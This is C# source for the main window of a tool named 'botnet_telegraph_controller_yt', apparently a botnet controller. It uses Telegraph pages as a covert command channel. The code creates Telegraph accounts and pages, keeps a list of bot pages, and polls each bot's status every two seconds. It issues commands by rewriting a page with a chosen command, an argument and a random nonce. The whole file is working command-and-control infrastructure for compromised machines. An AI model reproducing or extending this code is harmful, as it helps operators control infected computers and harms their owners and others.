using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace botnet_telegraph_controller_yt
{
    public partial class frmMain : Form
    {
        #region Variables

        private TelegraphServer tserver;
        private List<BotServer> botServers;

        private bool IsEnabledUpdating = false;

        #endregion

        #region Key methods

        public frmMain()
        {
            InitializeComponent();
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            botServers = new List<BotServer>();

            LoadToken();

            LoadBotsBase();
        }

        private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            IsEnabledUpdating = false;
        }

        #endregion

        #region Additional Methods

        private void LoadBotsBase()
        {
            if (File.Exists(configs.bots_list_file))
            {
                string[] bots_array = File.ReadAllLines(configs.bots_list_file);
                GetBotsInfo(bots_array);
            }

            cb_CMDs.Items.AddRange(configs.BotCommands);
        }

        private void GetBotsInfo(string[] addBots = null)
        {
            if (addBots != null)
            {
                foreach (string bot_server in addBots)
                {
                    BotServer bs = new BotServer(bot_server);
                    botServers.Add(bs);
                }
            }
            
            try
            {
                BeginInvoke(new Action(() => lv_BotsInfo.Items.Clear()));

                foreach (BotServer bot in botServers)
                {
                    BeginInvoke(new Action(() =>
                    {
                        lv_BotsInfo.Items.Add(new ListViewItem(bot.GetFullInfo()));
                    }));
                }
            }
            catch { }
        }

        private void UpdatingStates()
        {
            Thread thr_update = new Thread(new ThreadStart(() =>
            {
                while (IsEnabledUpdating)
                {
                    //try
                    //{

                    BeginInvoke(new Action(() =>
                    {
                        int selected_index = 0;
                        bool SelectAgain = false;

                        if (lv_BotsInfo.SelectedItems.Count > 0)
                        {
                            selected_index = lv_BotsInfo.SelectedItems[0].Index;
                            SelectAgain = true;
                        }


                        for (int i = 0; i < botServers.Count; i++)
                        {
                            botServers[i] = new BotServer(botServers[i].TelegraphPage);

                            lv_BotsInfo.Items[i] = new ListViewItem(botServers[i].GetFullInfo());
                        }

                        if (SelectAgain == true)
                        {
                            lv_BotsInfo.Items[selected_index].Selected = true;
                        }
                    }));


                    //}
                    //catch { }

                    Thread.Sleep(2000);
                }
            }));

            thr_update.Start();
        }

        private void SaveBotsBase()
        {
            List<string> pages_tmp = new List<string>();
            foreach (BotServer bot in botServers)
            {
                pages_tmp.Add(bot.TelegraphPage);
            }

            File.WriteAllLines(configs.bots_list_file, pages_tmp);
        }

        private void LoadToken()
        {
            if (File.Exists(configs.auth_file))
            {
                textBox_token.Text = File.ReadAllText(configs.auth_file);
            }
        }

        private void GetPages()
        {
            List<string> pages = tserver.GetPageList();

            listBox1.Items.Clear();

            foreach(string page in pages)
            {
                listBox1.Items.Add(page);
            }
        }

        private void LoadSelectedPage()
        {
            string html = web.GetHTML(textBox_selected_server.Text);

            Match regx = Regex.Match(html, "<p>(.*)</p></article>");
            lab_content.Text = regx.Groups[1].Value;

            Match regx2 = Regex.Match(html, "<h1 dir=\"auto\">(.*)</h1>");
            lab_title.Text = regx2.Groups[1].Value;
            configs.server_title = lab_title.Text;
        }

        #endregion

        #region FormControls Methods

        private void button_reg_Click(object sender, EventArgs e)
        {
            tserver = new TelegraphServer();
            tserver.CreateAccount(textBox_newAcc.Text);
            
            if(tserver.access_token.Length > 0)
            {
                textBox_token.Text = tserver.access_token;
                MessageBox.Show("Аккаунт создан!");
            }
            else
            {
                MessageBox.Show("Аккаунт не был создан!");
            }
        }

        private void button_auth_Click(object sender, EventArgs e)
        {
            tserver = new TelegraphServer(textBox_token.Text);

            button_auth.Enabled = false;
            button_change.Enabled = true;

            GetPages();
        }

        private void button_save_Click(object sender, EventArgs e)
        {
            File.WriteAllText(configs.auth_file, textBox_token.Text);
        }

        private void button_change_Click(object sender, EventArgs e)
        {
            tserver = new TelegraphServer();

            button_auth.Enabled = true;
            button_change.Enabled = false;

            listBox1.Items.Clear();
            textBox_selected_server.Text = string.Empty;
        }

        private void button_page_create_Click(object sender, EventArgs e)
        {
            tserver.CreatePage(textBox_page_create.Text);

            GetPages();
        }

        private void button_refresh_Click(object sender, EventArgs e)
        {
            GetPages();
        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            configs.server = listBox1.SelectedItem.ToString();
            textBox_selected_server.Text = "https://telegra.ph/" + configs.server;

            LoadSelectedPage();
        }

        private void button_send_Click(object sender, EventArgs e)
        {
            string cmd = cb_CMDs.Text + configs.spliter + tb_CMD.Text + configs.spliter + new Random().Next(0, 9999);

            if(tserver.EditPage(configs.server, configs.server_title, cmd))
            {
                LoadSelectedPage();
            }
        }

        private void btn_AddServers_Click(object sender, EventArgs e)
        {
            if (tb_ServersToAdd.Text.Length > 0)
            {
                string[] bots_array = tb_ServersToAdd.Lines;
                GetBotsInfo(bots_array);

                tb_ServersToAdd.Text = string.Empty;
            }
        }

        private void btn_UpdateInfo_Click(object sender, EventArgs e)
        {
            if (IsEnabledUpdating == false)
            {
                IsEnabledUpdating = true;
                UpdatingStates();

                btn_UpdateInfo.Text = "Выключить обновление";
            }
            else
            {
                IsEnabledUpdating = false;

                btn_UpdateInfo.Text = "Включить обновление";
            }
            GetBotsInfo();
        }

        private void btn_SaveBotsBase_Click(object sender, EventArgs e)
        {
            SaveBotsBase();
        }

        #endregion
    }
}
